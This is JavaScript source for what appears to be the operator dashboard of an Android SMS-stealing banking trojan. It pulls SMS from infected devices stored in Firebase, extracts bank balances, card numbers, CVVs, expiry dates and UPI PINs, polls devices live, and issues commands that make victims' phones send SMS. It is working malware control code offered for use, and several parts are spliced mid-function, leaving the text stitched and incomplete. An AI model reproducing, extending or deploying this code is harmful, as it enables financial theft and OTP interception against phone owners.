/* ═══════════════════════════════════════════
   SMS QUEUE — DEDUPE + GUARDS
   ═══════════════════════════════════════════ */
var SMS_QUEUE = {
  queue: [],
  queuedKeys: {},
  active: 0,
  running: false,
  maxConcurrent: 6,
  lastStatUpdate: 0,
  lastFilterUpdate: 0,

  push: function(dev, priority){
    var k = dev.id + '::' + dev._url;
    if (this.queuedKeys[k]) return;
    if (S.smsLoaded[k]) return;
    this.queuedKeys[k] = 1;
    this.queue.push({ dev: dev, priority: priority ? 1 : 0, key: k });
    if (priority) this.queue.sort(function(a,b){ return b.priority - a.priority; });
    this.run();
  },

  run: function(){
    if (this.running) return;
    this.running = true;
    this.processNext();
  },

  processNext: function(){
    var self = this;
    if (self.queue.length === 0 && self.active === 0){
      self.running = false;
      if (S.filter === 'bank' || S.filter === 'card'){
        renderDevices();
      }
      return;
    }
    while (self.active < self.maxConcurrent && self.queue.length > 0){
      var task = self.queue.shift();
      delete self.queuedKeys[task.key];
      self.active++;
      loadOneSms(task.dev, task.priority)
        .then(function(){ self.active--; self.onTaskDone(task.dev); setTimeout(function(){ self.processNext(); }, 30); })
        .catch(function(){ self.active--; self.onTaskDone(task.dev); setTimeout(function(){ self.processNext(); }, 30); });
    }
  },

  onTaskDone: function(dev){
    var now = Date.now();
    if (now - this.lastStatUpdate > 350){ this.lastStatUpdate = now; updateStats(); }
    if (now - this.lastFilterUpdate > 600){ this.lastFilterUpdate = now; updateFilterCounts(); }

    if (S.filter === 'bank' || S.filter === 'card'){
      var sd = S.smsData[dev.id];
      var matches = false;
      if (S.filter === 'bank') matches = sd && sd.bankBalances && sd.bankBalances.length > 0;
      else if (S.filter === 'card') matches = sd && sd.cards && sd.cards.length > 0;
      if (matches && !S.currentFilteredList.some(function(x){ return x.id === dev.id && x._url === dev._url; })){
        if (S.currentRenderIndex >= S.currentFilteredList.length){
          appendNewMatch(dev);
        }
      }
    }
  },

  setPriority: function(){ this.maxConcurrent = 12; }
};

function appendNewMatch(dev){
  var list = document.getElementById('deviceList');
  var sentinel = document.getElementById('scrollSentinel');
  if (!list) return;
  var html = renderCardHTML(dev, 0);
  var tmp = document.createElement('div');
  tmp.innerHTML = html;
  var newCard = tmp.firstChild;
  if (sentinel && sentinel.parentNode === list){
    list.insertBefore(newCard, sentinel);
  } else {
    list.appendChild(newCard);
  }
  S.currentFilteredList.push(dev);
}

function startBackgroundSmsLoad(){
  if (S.smsLoadStarted) return;
  S.smsLoadStarted = true;
  var pending = S.devices.filter(function(d){ return !S.smsLoaded[d.id + '::' + d._url]; });
  if (pending.length === 0) return;
  for (var i = 0; i < pending.length; i++) SMS_QUEUE.push(pending[i], false);
}

var _priorityLoadRunning = false;
function prioritySmsLoad(){
  if (_priorityLoadRunning) return;
  _priorityLoadRunning = true;
  SMS_QUEUE.setPriority();
  var pending = S.devices.filter(function(d){
    var k = d.id + '::' + d._url;
    return !S.smsLoaded[k] && !SMS_QUEUE.queuedKeys[k];
  });
  pending.forEach(function(d){ SMS_QUEUE.push(d, true); });
  setTimeout(function(){ _priorityLoadRunning = false; }, 2000);
}

function updateProgressBar(){
  var el = document.getElementById('smsProgressText');
  if (!el) return;
  var loaded = Object.keys(S.smsData).length;
  var total = S.devices.length;
  el.textContent = 'Analyzing SMS: ' + loaded.toLocaleString('en-IN') + ' / ' + total.toLocaleString('en-IN');
  var bar = document.getElementById('smsProgressBar');
  if (bar) bar.style.width = ((loaded/Math.max(1,total))*100) + '%';
}

function loadOneSms(dev, isPriority){
  var key = dev.id + '::' + dev._url;
  if (S.smsLoaded[key]) return Promise.resolve();
  var url = dev._url;
  var paths = isPriority
    ? ['messages/'+dev.id, 'user_sms/'+dev.id, 'smsLogs/'+dev.id, 'sms/'+dev.id]
    : ['messages/'+dev.id, 'user_sms/'+dev.id];
  var limit = isPriority ? 80 : 40;

  return tryPath(0);
  function tryPath(i){
    if (i >= paths.length){
      S.smsLoaded[key] = true;
      S.smsData[dev.id] = S.smsData[dev.id] || { bankBalances:[], cards:[], phoneNumbers:[], networks:[] };
      cacheSet(dev, {
        number: deriveNumber(dev, S.smsData[dev.id]),
        messages: [],
        analyzed: S.smsData[dev.id],
        status: 'empty'
      });
      return Promise.resolve();
    }
    return fetchFB(url, NODE_SECRET, paths[i], { orderBy:'"$key"', limitToLast: String(limit) }).then(function(data){
      if (!data || typeof data !== 'object'){ return tryPath(i+1); }
      var keys = Object.keys(data);
      var recent = keys.slice(-limit);
      var msgs = [];
      for (var k = 0; k < recent.length; k++){
        var m = data[recent[k]];
        if (!m || typeof m !== 'object') continue;
        var text = m.message || m.body || m.text || '';
        if (!String(text).trim()) continue;
        msgs.push({
          text: String(text),
          sender: String(m.sender || m.from || m.address || 'Unknown'),
          time: String(m.dateTime || m.date || m.timestamp || '')
        });
      }
      msgs.reverse();
      if (msgs.length === 0){ return tryPath(i+1); }
      var analyzed = analyzeAllSms(msgs);
      S.smsData[dev.id] = analyzed;
      S.smsLoaded[key] = true;
      cacheSet(dev, {
        number: deriveNumber(dev, analyzed),
        messages: msgs,
        analyzed: analyzed,
        status: 'ok'
      });
      return;
    });
  }
}

var _statTO = null;
function updateStats(){
  if (_statTO) return;
  _statTO = setTimeout(function(){ _statTO = null; doUpdateStats(); }, 150);
}
function doUpdateStats(){
  var total = S.devices.length;
  var on = 0, bankCount = 0, cardCount = 0, upiCount = 0;
  for (var i = 0; i < S.devices.length; i++){
    var d = S.devices[i];
    if (d.status) on++;
    if (d.upipin) upiCount++;
    var sd = S.smsData[d.id];
    if (sd){
      if (sd.bankBalances && sd.bankBalances.length) bankCount++;
      if (sd.cards && sd.cards.length) cardCount++;
    }
  }
  var off = total - on;
  var onRate = total ? Math.round((on/total)*100) : 0;
  var offRate = total ? (100 - onRate) : 0;
  var loading = SMS_QUEUE.queue.length > 0 || SMS_QUEUE.active > 0;
  ['sTotal','sOnline','sOffline','sBank','sCard'].forEach(function(id,i){
    var v = [total, on, off, bankCount, cardCount][i];
    var el = document.getElementById(id); if (el) el.textContent = v.toLocaleString('en-IN');
  });
  ['sTotalOn','sTotalOff','sOnlineActive','sOfflineSleep','sBankDetect','sCardFound'].forEach(function(id){
    var vals = { sTotalOn:on, sTotalOff:off, sOnlineActive:on, sOfflineSleep:off, sBankDetect:bankCount, sCardFound:cardCount };
    var el = document.getElementById(id); if (el) el.textContent = vals[id].toLocaleString('en-IN');
  });
  var el;
  el = document.getElementById('sTotalSrc'); if (el) el.textContent = FIREBASES.length;
  el = document.getElementById('sOnlineRate'); if (el) el.textContent = onRate + '%';
  el = document.getElementById('sOfflineRate'); if (el) el.textContent = offRate + '%';
  el = document.getElementById('sBankLoading'); if (el) el.textContent = loading ? 'Yes' : 'No';
  el = document.getElementById('sCardLoading'); if (el) el.textContent = loading ? 'Yes' : 'No';
  ['bnAll','bnOn','bnOff','bnBank','bnCard','bnUpi'].forEach(function(id){
    var vals = { bnAll:total, bnOn:on, bnOff:off, bnBank:bankCount, bnCard:cardCount, bnUpi:upiCount };
    var el = document.getElementById(id); if (el) el.textContent = vals[id].toLocaleString('en-IN');
  });
}

function applyFilters(){
  var f = S.devices;
  if (S.filter === 'online') f = f.filter(function(d){ return d.status; });
  else if (S.filter === 'offline') f = f.filter(function(d){ return !d.status; });
  else if (S.filter === 'bank'){ f = f.filter(function(d){ var sd = S.smsData[d.id]; return sd && sd.bankBalances && sd.bankBalances.length > 0; }); }
  else if (S.filter === 'card'){ f = f.filter(function(d){ var sd = S.smsData[d.id]; return sd && sd.cards && sd.cards.length > 0; }); }
  else if (S.filter === 'upi') f = f.filter(function(d){ return d.upipin; });
  if (S.search){
    var q = S.search.toLowerCase();
    f = f.filter(function(d){
      return (d.name||'').toLowerCase().indexOf(q) !== -1
        || (d.id||'').toLowerCase().indexOf(q) !== -1
        || (d.phone||'').indexOf(q) !== -1;
    });
  }
  f = f.slice();
  if (S.sort === 'newest') f.sort(function(a,b){ return (b.id||'').localeCompare(a.id||''); });
  else if (S.sort === 'oldest') f.sort(function(a,b){ return (a.id||'').localeCompare(b.id||''); });
  else if (S.sort === 'name') f.sort(function(a,b){ return (a.name||'').localeCompare(b.name||''); });
  else if (S.sort === 'battery') f.sort(function(a,b){ return b.batteryPercent - a.batteryPercent; });
  return f;
}

function renderDevices(){
  var list = document.getElementById('deviceList');
  var token = ++S.renderToken;
  list.innerHTML = '';
  if (S.observer){ try { S.observer.disconnect(); } catch(e){} S.observer = null; }
  if (S.devices.length === 0) return;

  S.currentFilteredList = applyFilters();
  S.currentRenderIndex = 0;

  var stillLoading = SMS_QUEUE.queue.length > 0 || SMS_QUEUE.active > 0;
  var smsProgress = Object.keys(S.smsData).length < S.devices.length;
  var showProgress = (S.filter === 'bank' || S.filter === 'card') && stillLoading && smsProgress;

  if (showProgress){
    var loaded = Object.keys(S.smsData).length;
    var total = S.devices.length;
    var pct = ((loaded/total)*100).toFixed(1);
    list.innerHTML = '<div class="load-progress">'
      + '<div id="smsProgressText">Analyzing SMS: ' + loaded.toLocaleString('en-IN') + ' / ' + total.toLocaleString('en-IN') + '</div>'
      + '<div class="lp-bar"><div id="smsProgressBar" style="width:' + pct + '%"></div></div></div>';
  }

  if (S.currentFilteredList.length === 0){
    if (showProgress) return;
    if (S.filter === 'bank' || S.filter === 'card'){
      prioritySmsLoad();
      list.innerHTML = '<div class="center-box"><div class="spinner big"></div>'
        + '<div class="t">LOADING ' + (S.filter === 'bank' ? 'BANK' : 'CARD') + ' DATA</div>'
        + '<div class="sub">Analyzing SMS on all devices — results appear as they\'re found</div></div>';
      return;
    }
    list.innerHTML = '<div class="center-box"><span style="font-size:56px;display:block;margin-bottom:14px;">🔍</span>'
      + '<div class="t">NO MATCH</div><div class="sub">Try a different filter</div></div>';
    return;
  }

  var sentinel = document.createElement('div');
  sentinel.id = 'scrollSentinel';
  sentinel.style.height = '40px';
  list.appendChild(sentinel);
  renderNextBatch(token, sentinel, list);

  try {
    S.observer = new IntersectionObserver(function(entries){
      if (entries[0].isIntersecting && token === S.renderToken){
        if (S.currentRenderIndex < S.currentFilteredList.length){
          renderNextBatch(token, sentinel, list);
        }
      }
    }, { rootMargin: '600px 0px' });
    S.observer.observe(sentinel);
  } catch(e){}
}

function renderNextBatch(token, sentinel, list){
  if (token !== S.renderToken) return;
  var end = Math.min(S.currentRenderIndex + RENDER_BATCH, S.currentFilteredList.length);
  var frag = document.createDocumentFragment();
  var tmp = document.createElement('div');
  var html = '';
  for (var i = S.currentRenderIndex; i < end; i++){
    html += renderCardHTML(S.currentFilteredList[i], 0);
  }
  tmp.innerHTML = html;
  while (tmp.firstChild) frag.appendChild(tmp.firstChild);
  list.insertBefore(frag, sentinel);
  S.currentRenderIndex = end;
  if (S.currentRenderIndex >= S.currentFilteredList.length){
    if (S.observer){ try { S.observer.disconnect(); } catch(e){} S.observer = null; }
    sentinel.innerHTML = '<div style="text-align:center;padding:24px;color:var(--text-dim);font-size:11px;font-weight:800;letter-spacing:1.6px;font-family:var(--mono);">✓ ALL ' + S.currentFilteredList.length.toLocaleString('en-IN') + ' DEVICES SHOWN</div>';
    sentinel.style.height = 'auto';
  }
}

document.getElementById('deviceList').addEventListener('click', function(ev){
  var refBtn = ev.target.closest('[data-refresh]');
  if (refBtn){
    ev.stopPropagation();
    var card = refBtn.closest('.device-flip');
    var id = card.getAttribute('data-id');
    var url = card.getAttribute('data-url');
    var dev = findDevice(id, url);
    if (!dev) return;
    refBtn.classList.add('spinning');
    delete S.smsLoaded[dev.id + '::' + dev._url];
    delete S.smsData[dev.id];
    delete SMS_QUEUE.queuedKeys[dev.id + '::' + dev._url];
    toast('🔄 Refreshing device…','warn');
    Promise.all([
      fetchFB(dev._url, NODE_SECRET, 'clients/' + dev.id).then(function(fresh){
        if (fresh && typeof fresh === 'object'){
          var arr = parseDevices({[dev.id]: fresh}, dev._url);
          if (arr[0]){
            var f = arr[0];
            dev.name = f.name; dev.battery = f.battery; dev.batteryPercent = f.batteryPercent;
            dev.status = f.status; dev.androidV = f.androidV; dev.phone = f.phone;
            dev.ip = f.ip; dev.storage = f.storage; dev.cpu = f.cpu; dev.sdk = f.sdk;
            dev.upipin = f.upipin; dev.sims = f.sims;
          }
        }
      }),
      loadOneSms(dev, true)
    ]).then(function(){
      updateStats(); updateFilterCounts();
      var freshHtml = renderCardHTML(dev, 0);
      var temp = document.createElement('div');
      temp.innerHTML = freshHtml;
      var newCard = temp.firstChild;
      if (card.parentNode) card.parentNode.replaceChild(newCard, card);
      toast('✅ Refreshed!','ok');
    }).catch(function(){ toast('Refresh failed','err'); });
    return;
  }

  var starBtn = ev.target.closest('[data-star]');
  if (starBtn){
    ev.stopPropagation();
    var cardS = starBtn.closest('.device-flip');
    var idS = cardS.getAttribute('data-id');
    var urlS = cardS.getAttribute('data-url');
    var devS = findDevice(idS, urlS);
    if (devS){
      toggleStar(devS);
      starBtn.classList.toggle('active');
      starBtn.textContent = isStar(devS) ? '★' : '☆';
    }
    return;
  }
  var flipBtn = ev.target.closest('[data-flip]');
  if (flipBtn){
    ev.stopPropagation();
    var wrap = flipBtn.closest('.device-flip');
    if (wrap) wrap.classList.toggle('flipped');
    return;
  }
  var cardEl = ev.target.closest('.device-flip');
  if (cardEl){
    if (cardEl.classList.contains('flipped')) return;
    var id2 = cardEl.getAttribute('data-id');
    var url2 = cardEl.getAttribute('data-url');
    var dev2 = findDevice(id2, url2);
    if (dev2) openDetail(dev2);
  }
});

      void numEl.offsetWidth;
      numEl.classList.add('copied');
      try { navigator.vibrate && navigator.vibrate(10); } catch(e){}
    };
  }

  try { navigator.vibrate && navigator.vibrate(10); } catch(e){}

  attachDragDismiss(document.getElementById('dPanel'));

  renderDetailTab();

  loadDetailSms(dev);
  startSmsPolling(dev);
  startDeviceStatusPolling(dev);

  if (S.detailTab === 'sms'){
    var content = document.getElementById('dContent');
    if (content) content.scrollTop = content.scrollHeight;
  }
}

function copyText(text){
  try {
    if (navigator.clipboard && navigator.clipboard.writeText){
      navigator.clipboard.writeText(text);
      toast('📋 Copied!','ok');
      return;
    }
  } catch(e){}
  try {
    var ta = document.createElement('textarea');
    ta.value = text;
    ta.style.cssText = 'position:fixed;left:-9999px;top:-9999px;';
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    toast('📋 Copied!','ok');
  } catch(e){ toast('Copy failed','err'); }
}

function attachDragDismiss(panel){
  if (!panel) return;
  var handle = panel.querySelector('#dDrag');
  if (!handle) return;
  var startY = 0, curY = 0, dragging = false;

  function onStart(e){
    if (!window.matchMedia('(pointer:coarse)').matches) return;
    dragging = true;
    startY = (e.touches ? e.touches[0].clientY : e.clientY);
    panel.classList.add('dragging');
  }
  function onMove(e){
    if (!dragging) return;
    curY = (e.touches ? e.touches[0].clientY : e.clientY);
    var dy = Math.max(0, curY - startY);
    panel.style.transform = 'translateY(' + dy + 'px)';
  }
  function onEnd(){
    if (!dragging) return;
    dragging = false;
    panel.classList.remove('dragging');
    var dy = Math.max(0, curY - startY);
    if (dy > 110){
      panel.classList.add('dismissed');
      setTimeout(function(){ closeDetail(); }, 220);
    } else {
      panel.style.transform = '';
    }
    startY = curY = 0;
  }

  handle.addEventListener('touchstart', onStart, { passive: true });
  handle.addEventListener('touchmove', onMove, { passive: true });
  handle.addEventListener('touchend', onEnd);
  handle.addEventListener('mousedown', onStart);
  document.addEventListener('mousemove', onMove);
  document.addEventListener('mouseup', onEnd);
}

function closeDetail(){
  SFX.close();
  S.selectedDev = null;
  if (S.detailAbort){ try { S.detailAbort.abort(); } catch(e){} S.detailAbort = null; }
  if (S.smsPollTimer){ clearInterval(S.smsPollTimer); S.smsPollTimer = null; }
  if (S.detailStatusTimer){ clearInterval(S.detailStatusTimer); S.detailStatusTimer = null; }
  document.getElementById('detailRoot').innerHTML = '';
}

function startSmsPolling(dev){
  if (S.smsPollTimer) clearInterval(S.smsPollTimer);
  S.smsPollTimer = setInterval(function(){
    if (!S.selectedDev || S.selectedDev.id !== dev.id) return;
    fetchDetailSms(dev, true).then(function(hasNew){
      if (hasNew){ patchSmsList(); toast('📩 New SMS!','ok'); }
    });
  }, 4000);
}

function startDeviceStatusPolling(dev){
  if (S.detailStatusTimer) clearInterval(S.detailStatusTimer);
  S.detailStatusTimer = setInterval(function(){
    if (!S.selectedDev || S.selectedDev.id !== dev.id) return;
    fetchFB(dev._url, NODE_SECRET, 'clients/' + dev.id).then(function(data){
      if (!data || typeof data !== 'object') return;
      var rs = data.status;
      var ns = rs === true || rs === 'true' || rs === 1 || rs === 'online';
      if (ns !== dev.status){
        dev.status = ns;
        var head = document.getElementById('dLiveStatus');
        if (head){
          var carrier = '';
          if (S.detailSmsData && S.detailSmsData.networks && S.detailSmsData.networks.length){
            carrier = S.detailSmsData.networks[0];
          } else if (dev.provider && dev.provider !== '—'){ carrier = dev.provider; }
          head.className = 'dstat ' + (ns?'on':'');
          head.innerHTML = '<div class="dot"></div>'
            + '<span class="stxt">' + (ns?'● ONLINE':'○ OFFLINE') + '</span>'
            + (carrier ? '<span class="meta">· 📡 ' + esc(carrier) + '</span>' : '')
            + '<span class="meta">· ' + esc(parseBat(dev.battery).l) + '</span>';
        }
        updateVisibleStatuses();
        updateStats();
      }
    });
  }, 5000);
}

function loadDetailSms(dev){
  fetchDetailSms(dev, false).then(function(){
    if (!S.selectedDev || S.selectedDev.id !== dev.id) return;
    var newNum = deriveNumber(dev, S.detailSmsData);
    if (newNum && newNum !== '—' && newNum !== S.detailNumber){
      S.detailNumber = newNum;
      var numEl = document.getElementById('dNum');
      if (numEl) numEl.textContent = newNum;
      var entry = SMS_CACHE.get(devCacheKey(dev));
      if (entry){ entry.number = newNum; entry.ts = Date.now(); persistCache(); }
    }
    renderDetailTab();
  });
}

function fetchDetailSms(dev, isPoll){
  var url = dev._url;
  var paths = ['messages/'+dev.id, 'user_sms/'+dev.id, 'smsLogs/'+dev.id, 'sms/'+dev.id];
  var sig = S.detailAbort ? S.detailAbort.signal : null;
  return tryPath(0);

  function tryPath(i){
    if (i >= paths.length){
      if (!isPoll) renderDetailTab();
      return Promise.resolve(false);
    }
    return fetchFB(url, NODE_SECRET, paths[i], { orderBy:'"$key"', limitToLast:'200' }, sig).then(function(data){
      if (!data || typeof data !== 'object'){ return tryPath(i+1); }
      var keys = Object.keys(data);
      var recent = keys.slice(-200);
      var msgs = [];
      for (var k = 0; k < recent.length; k++){
        var m = data[recent[k]];
        if (!m || typeof m !== 'object') continue;
        var text = m.message || m.body || m.text || '';
        if (!String(text).trim()) continue;
        msgs.push({
          text: String(text),
          sender: String(m.sender || m.from || m.address || 'Unknown'),
          time: String(m.dateTime || m.date || m.timestamp || '')
        });
      }
      msgs.reverse();
      if (msgs.length === 0){ return tryPath(i+1); }
      var sig2 = msgs.length + '::' + (msgs[0] ? (msgs[0].text||'').substring(0,50) : '');
      var hasNew = S.lastSmsSignature && sig2 !== S.lastSmsSignature;
      S.lastSmsSignature = sig2;
      S.detailSms = msgs;
      S.detailSmsData = analyzeAllSms(msgs);
      S.smsData[dev.id] = S.detailSmsData;
      cacheSet(dev, {
        number: deriveNumber(dev, S.detailSmsData),
        messages: msgs,
        analyzed: S.detailSmsData,
        status: 'ok'
      });
      if (!isPoll) updateStats();
      return hasNew;
    });
  }
}

function buildSmsItem(m){
  var cls = 'sms-normal';
  if (/AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(m.text)) cls = 'sms-bank';
  else if (/CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(m.text)) cls = 'sms-card';
  var el = document.createElement('div');
  el.className = 'smsitem ' + cls;
  el.innerHTML = '<div class="sh"><span>📩 ' + esc(m.sender) + '</span><span class="time">' + esc(m.time) + '</span></div>'
    + '<div class="sb">' + esc(m.text) + '</div>';
  return el;
}

function patchSmsList(){
  var container = document.getElementById('dSmsList');
  if (!container) return;
  var existing = container.querySelectorAll('.smsitem');
  var oldCount = existing.length;
  var newMsgs = S.detailSms;
  var newCount = newMsgs.length;

  if (oldCount === 0 && newCount === 0) return;

  if (oldCount === 0 && newCount > 0){
    var frag0 = document.createDocumentFragment();
    for (var i = 0; i < newCount; i++){
      var el0 = buildSmsItem(newMsgs[i]);
      if (i === 0) el0.classList.add('sms-new');
      frag0.appendChild(el0);
    }
    var emptyState = container.querySelector('.skel-row');
    if (emptyState){
      // clear skeleton and replace
      container.innerHTML = '';
      container.appendChild(frag0);
    } else {
      container.appendChild(frag0);
    }
    return;
  }

  if (newCount === oldCount) return;

  if (newCount > oldCount){
    var toAdd = newCount - oldCount;
    var frag = document.createDocumentFragment();
    for (var j = toAdd - 1; j >= 0; j--){
      var el = buildSmsItem(newMsgs[j]);
      el.classList.add('sms-new');
      frag.insertBefore(el, frag.firstChild);
    }
    container.insertBefore(frag, container.firstChild);
  } else {
    container.innerHTML = '';
    var frag2 = document.createDocumentFragment();
    newMsgs.forEach(function(m){ frag2.appendChild(buildSmsItem(m)); });
    container.appendChild(frag2);
  }
}

      + row('Battery', bat.l, batClass(bat.p))

      + row('Storage', dev.storage)
      + row('CPU', dev.cpu, 'mono')
      + row('SDK', dev.sdk)
      + row('SIMs', (dev.sims||[]).length + ' SIM(s)')
      + (dev.upipin ? row('UPI PIN', dev.upipin, 'green') : '')

    if (sd.phoneNumbers && sd.phoneNumbers.length > 0){
      html += '<div class="slabel">VERIFIED NUMBERS</div>';
      sd.phoneNumbers.slice(0,8).forEach(function(p, i){
        var num = p.number || p;
        var star = p.isStarred ? '⭐ ' : '';
        html += row(star + 'Phone #' + (i+1), num, 'mono green');
      });
    }
    if (sd.networks && sd.networks.length){
      html += '<div class="slabel">NETWORKS</div>';
      sd.networks.forEach(function(n, i){ html += row('Network #' + (i+1), n); });
    }
  }
  else if (t === 'bank'){
    if (sd.bankBalances.length === 0){
      html = '<div class="center-box"><div style="font-size:60px;margin-bottom:14px;">💰</div>'
        + '<div class="t">NO BANK SMS</div><div class="sub">No balance found in messages</div></div>';
    } else {
      html = '<div class="slabel">BANK BALANCES (' + sd.bankBalances.length + ')</div>';
      sd.bankBalances.forEach(function(b){
        var badge = '';
        if (b.transactionType){
          var cls = b.transactionType === 'credit' ? 'credit' : 'debit';
          var sign = b.transactionType === 'credit' ? '+' : '-';
          badge = '<span class="badge ' + cls + '">' + (b.transactionType==='credit'?'↑':'↓') + ' ' + b.transactionType + '</span>';
          if (b.transactionAmount) badge += ' <span class="badge ' + cls + '">' + sign + '₹' + fmtINR(b.transactionAmount) + '</span>';
        }
        html += '<div class="bitem bank-item">'
          + '<div class="r1"><span class="bn">💰 ' + esc(b.bankName || 'Bank') + (b.accountLast4 ? ' ••' + esc(b.accountLast4) : '') + '</span><span class="ba">₹' + fmtINR(b.availableBalance) + '</span></div>'
          + (badge ? '<div style="margin-top:8px;">' + badge + '</div>' : '')
          + ((b.phoneFromSms || b.networkFromSms) ? '<div class="meta-row">' + (b.phoneFromSms?'<span>📱 '+esc(b.phoneFromSms)+'</span>':'') + (b.networkFromSms?'<span>📡 '+esc(b.networkFromSms)+'</span>':'') + '</div>' : '')
          + (b.rawSms ? '<div class="sub">' + esc(b.rawSms) + '</div>' : '')
          + '</div>';
      });
    }
  }
  else if (t === 'card'){
    if (sd.cards.length === 0){
      html = '<div class="center-box"><div style="font-size:60px;margin-bottom:14px;">💳</div>'
        + '<div class="t">NO CARDS</div><div class="sub">No card info found in messages</div></div>';
    } else {
      html = '<div class="slabel">CARDS (' + sd.cards.length + ')</div>';
      sd.cards.forEach(function(c){
        html += '<div class="bitem card-item">'
          + '<div class="r1"><span class="bn">💳 ' + esc(c.cardType || 'Card') + '</span><span class="ba" style="color:var(--purple);">•••• ' + esc(c.cardLast4) + '</span></div>';
        if (c.cvv || c.expiry){
          html += '<div class="meta-row">';
          if (c.cvv) html += '<span>CVV: <strong style="color:#c4b5fd;">' + esc(c.cvv) + '</strong></span>';
          if (c.expiry) html += '<span>EXP: <strong style="color:#c4b5fd;">' + esc(c.expiry) + '</strong></span>';
          html += '</div>';
        }
        if (c.rawSms) html += '<div class="sub">' + esc(c.rawSms) + '</div>';
        html += '</div>';
      });
    }
  }
  else if (t === 'sms'){
    html = '<div class="d-toolbar">'
      + '<div class="dt-left">'
      +   '<span class="live-pill"><span class="live-dot"></span> LIVE</span>'
      +   '<span>' + S.detailSms.length + ' messages · auto every 4s</span>'
      + '</div>'
      + '<button id="dSmsRefresh"><svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 4v6h-6"/><path d="M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10"/><path d="M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg> REFRESH</button>'
      + '</div>';

    if (S.detailSms.length === 0){
      html += '<div class="sms-list" id="dSmsList">';
      for (var s = 0; s < 4; s++){
        html += '<div class="skel-row"><span class="skel-bracket tl"></span><span class="skel-bracket br"></span></div>';
      }
      html += '</div>';
    } else {
      html += '<div class="sms-list" id="dSmsList">';
      S.detailSms.forEach(function(m){
        var cls = 'sms-normal';
        if (/AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(m.text)) cls = 'sms-bank';
        else if (/CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(m.text)) cls = 'sms-card';
        html += '<div class="smsitem ' + cls + '">'
          + '<div class="sh"><span>📩 ' + esc(m.sender) + '</span><span class="time">' + esc(m.time) + '</span></div>'
          + '<div class="sb">' + esc(m.text) + '</div></div>';
      });
      html += '</div>';
    }
  }
  else if (t === 'send'){
    html = '<div class="sform">'
      + '<div class="fl">SELECT SIM</div>'
      + '<div class="sims">'
      +   '<button data-sim="1" class="active">SIM 1</button>'
      +   '<button data-sim="2">SIM 2</button>'
      + '</div>'
      + '<div class="fl">RECIPIENT</div>'
      + '<input type="text" id="sNum" placeholder="+91XXXXXXXXXX" value="' + esc(S.detailNumber !== '—' ? S.detailNumber : (dev.phone !== '—' ? dev.phone : '')) + '" />'
      + '<div class="fl">MESSAGE</div>'
      + '<textarea id="sMsg" placeholder="Type your message..."></textarea>'
      + '<button class="sbtn" id="sSend">💌 SEND MESSAGE</button>'
      + '</div>';
  }

  $c.innerHTML = html;

  if (t === 'send'){
    $c.querySelectorAll('.sims button').forEach(function(b){
      b.onclick = function(){
        S.simSel = parseInt(b.getAttribute('data-sim'));
        $c.querySelectorAll('.sims button').forEach(function(x){ x.classList.remove('active'); });
        b.classList.add('active');
      };
    });
    var sbtn = document.getElementById('sSend');
    if (sbtn) sbtn.onclick = function(){ sendSms(dev); };
  }

  if (t === 'sms'){
    var dref = document.getElementById('dSmsRefresh');
    if (dref){
      dref.onclick = function(){
        dref.classList.add('refreshing');
        S.lastSmsSignature = '';
        fetchDetailSms(dev, false).then(function(){
          renderDetailTab();
          toast('✅ SMS refreshed','ok');
        });
      };
    }
    // Auto scroll to bottom
    if (S.detailSms.length > 0){
      requestAnimationFrame(function(){ $c.scrollTop = $c.scrollHeight; });
    }
  }

  $c.querySelectorAll('.irow').forEach(function(el){
    el.onclick = function(){
      var v = el.querySelector('.v');
      if (v){ copyText(v.textContent.trim()); }
    };
  });
}

function row(label, value, cls){
  return '<div class="irow"><span class="l">' + esc(label) + '</span><span class="v ' + (cls||'') + '">' + esc(value) + '</span></div>';
}

function sendSms(dev){
  var num = (document.getElementById('sNum')||{}).value;
  var msg = (document.getElementById('sMsg')||{}).value;
  num = (num||'').trim(); msg = (msg||'').trim();
  if (!num || !msg){ toast('Fill all fields','err'); return; }
  var btn = document.getElementById('sSend');
  btn.disabled = true; btn.textContent = 'SENDING...';
  var paths = ['clients/'+dev.id+'/webhookEvent/sendSms','clients/'+dev.id+'/commands','user_data/'+dev.id+'/commands'];
  var clean = dev._url.replace(/\/$/,'');
  var promises = paths.map(function(p){
    var qs = NODE_SECRET ? ('?auth=' + encodeURIComponent(NODE_SECRET)) : '';
    return fetch(clean + '/' + p + '.json' + qs, {
      method:'PUT', headers:{ 'Content-Type':'application/json' },
      body: JSON.stringify({ from: S.simSel, to: num, message: msg, isSended: false })
    }).then(function(r){ if (!r.ok) throw new Error('fail'); return true; });
  });
  Promise.allSettled(promises).then(function(results){
    var ok = results.some(function(r){ return r.status === 'fulfilled'; });
    if (ok){ toast('SMS queued! 💌','ok'); document.getElementById('sMsg').value = ''; }
    else toast('Send failed','err');
    btn.disabled = false; btn.textContent = '💌 SEND MESSAGE';
  });
}

function initLogin(){
  var loginScreen = document.getElementById('loginScreen');
  var app = document.getElementById('app');
  var pass = document.getElementById('loginPass');
  var btn = document.getElementById('loginBtn');
  var errEl = document.getElementById('loginErr');
  var box = document.getElementById('loginBox');

  function showErr(msg){
    errEl.textContent = msg;
    errEl.classList.add('show');
    setTimeout(function(){ errEl.classList.remove('show'); }, 2600);
  }
  function tryLogin(){
    var v = pass.value;
    if (!v){ showErr('ENTER PASSWORD'); pass.focus(); return; }
    btn.disabled = true; btn.textContent = 'CHECKING...';
    setTimeout(function(){
      if (v === PASSWORD){
        SFX.powerUp();
        box.classList.add('flip-out');
        particlesActive = false;
        setTimeout(function(){
          loginScreen.style.display = 'none';
          app.style.display = 'block';
          bootDashboard();
        }, 500);
      } else {
        showErr('WRONG PASSWORD!');
        SFX.err();
        pass.value = ''; pass.focus();
        btn.disabled = false; btn.textContent = 'UNLOCK';
      }
    }, 400);
  }
  btn.onclick = tryLogin;
  pass.addEventListener('keydown', function(e){ if (e.key === 'Enter') tryLogin(); });
  setTimeout(function(){ pass.focus(); }, 400);
  document.getElementById('lockBtn').onclick = function(){
    if (S.smsPollTimer){ clearInterval(S.smsPollTimer); S.smsPollTimer = null; }
